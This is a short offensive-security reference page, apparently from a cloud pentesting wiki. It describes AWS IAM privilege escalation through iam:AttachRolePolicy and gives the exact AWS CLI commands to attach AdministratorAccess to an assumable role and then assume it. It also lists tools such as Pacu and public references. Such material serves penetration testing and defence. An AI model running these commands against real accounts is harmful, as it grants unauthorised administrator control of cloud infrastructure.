---
title: "AttachRolePolicy: attach a privileged policy to a role you can assume"
description: "iam:AttachRolePolicy to attach a privileged managed policy to a role you can assume."
keywords:
  - AttachRolePolicy
  - role
  - managed policy
  - AdministratorAccess
  - attach
---

# AttachRolePolicy

`iam:AttachRolePolicy` attaches a managed policy to a role. If you can already assume a role (or pass it to a service), attaching `AdministratorAccess` to that role turns it into an admin role you then use.

## Attach then assume

```bash
aws iam attach-role-policy --role-name <assumable-role> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<assumable-role> \
  --role-session-name s
```

## Exploitation notes

- Pair with [role assumption](../../role-assumption/index.md): the attach is only useful on a role you can reach, by assuming it or passing it to a service.
- Pre-existing session credentials for the role do not pick up the new policy until a fresh `AssumeRole`.

## Tools

- **AWS CLI** (`iam attach-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (AttachRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
